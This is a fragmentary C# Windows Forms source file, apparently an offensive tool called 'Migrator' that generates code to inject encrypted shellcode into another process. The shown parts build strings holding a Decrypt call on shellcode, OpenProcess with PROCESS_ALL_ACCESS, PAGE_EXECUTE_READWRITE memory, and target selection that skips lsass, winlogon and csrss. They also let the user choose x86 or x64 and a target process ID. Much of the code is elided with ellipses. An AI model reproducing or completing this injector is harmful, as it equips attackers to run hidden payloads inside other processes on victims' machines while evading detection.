...
namespace Migrator
{
    public partial class Form1 : Form
    {
            ...
            if(int.TryParse(prt.Text,out check)==true)
            {
                ...
                if (octet != null)
                {
                    if (arch.SelectedIndex == 0)
                    {
                        ...
                        if ((checkBox1.Checked == false && processid.Enabled == false) || int.TryParse(processid.Text, out check) == false)
                            migrationCode = code(enc,index,"x64");
                        else
                            if (checkBox1.Checked == true && processid.Text != null && int.TryParse(processid.Text, out check) == true)
                                migrationCode = code(enc, index, "x64",Convert.ToInt32(processid.Text));
                    ...
                    else if (arch.SelectedIndex == 1)
                    {
                        ...
                        string migrationCode = "";
                        if ((checkBox1.Checked == false && processid.Enabled == false) || int.TryParse(processid.Text, out check) == false)
                            migrationCode = code(enc, index, "x86");
                        else
                            if (checkBox1.Checked == true && processid.Text != null && int.TryParse(processid.Text, out check) == true)
                                migrationCode = code(enc, index, "x86", Convert.ToInt32(processid.Text));
                                                ...
                                                "{"+
                                                     ...
                                                     "try"+
                                                        "{"+
                                                            ...
                                                            "Process[] csrss = Process.GetProcessesByName(\"csrss\");"+
                                                            "Process winlogon = Process.GetProcessesByName(\"winlogon\")[0];"+
                                                            "if (lsass.Id == migrate.Id || winlogon.Id == migrate.Id)"+
                                                            "{"+
                                                                "continue;"+
                                                            "}"+
                                                            "bool equal = false;"+
                                                            "foreach (Process csrssexe in csrss)"+
                                                            "{"+
                                                                "if (csrssexe.Id == migrate.Id)"+
                                                                "{"+
                                                                    "equal = true;"+
                                                                "}"+
                                                            "}"+
        ...
        public string code(string shCode, string[] indis, string arch,int id)
        {
            string IniVec = IV[0].ToString();
            for (int i = 1; i < IV.Length; i++)
            {
                                ...
                                "{" +
                                        ...
                                        "byte[] byteShellCode = Decrypt(code);" +
                                            ...
                                            "MemoryProtection PAGE_EXECUTE_READWRITE = MemoryProtection.ExecuteReadWrite;" +
                                                ...
                                                "IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false,"+id.ToString()+");" +
